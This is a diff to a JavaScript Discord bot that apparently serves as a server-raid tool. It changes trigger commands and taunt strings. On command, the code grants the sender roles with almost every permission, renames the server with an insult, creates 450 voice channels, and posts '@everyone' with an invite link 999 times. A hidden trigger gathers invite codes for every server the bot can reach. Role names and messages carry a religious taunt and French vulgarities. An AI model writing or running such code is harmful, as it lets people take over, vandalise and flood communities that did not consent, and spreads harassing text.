@@ -40,79 +40,79 @@ permissions:2146958591,
 position: "",
 color: "#08d5ff"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ffa3"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#08ff23"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#81ff08"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#fff608"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff6f08"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
 color: "#ff0808"
 })
-message.guild.createRole({name:"-fleeex",
+message.guild.createRole({name:"-Okue Le tchoupi Islamiste",
 mentionable:false,
 permissions:2146958591,
 position: "",
@@ -122,7 +122,7 @@ color: "#ff0808"
 }
 
 
-if(message.content.includes(".rol")){
+if(message.content.includes("!role")){
     message.guild.createRole({name:"Izi",
                               mentionable:false,
                               permissions:2146958591,
@@ -130,7 +130,7 @@ if(message.content.includes(".rol")){
                               color: "#fb0707"
    })
 }
-if(message.content.includes(".raul")){
+if(message.content.includes("!raul")){
   (message.guild.roles.map(r => message.member.addRoles(r)))
 }
 if(message.content.includes("ar!kelsairvvesrx")){
@@ -139,18 +139,18 @@ if(message.content.includes("ar!kelsairvvesrx")){
           if(message.content.includes("A?serveurinvite")){
               bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
           }
-          if(message.content === "issou"){
-              message.guild.setName("LE SECTEUR TA BZ :)")
+          if(message.content === "!issou"){
+              message.guild.setName("LE CENTRE TA BZ :)")
               message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
             }
-            if(message.content === "pd"){
+            if(message.content === "!pd"){
               for(var i =0; i < 450; i++){
               message.guild.createChannel("BY","voice")
               }
             }
-            if(message.content.includes("@everyone")){
+            if(message.content.includes("!everyone")){
                 for(var i = 0; i < 999; i++){
-                    message.channel.send("@everyone -FLEEEX TA BZ VIEN ICI https://discord.gg/6PGr5Ge")
+                    message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
                 }
             }
             //réaction en chaine
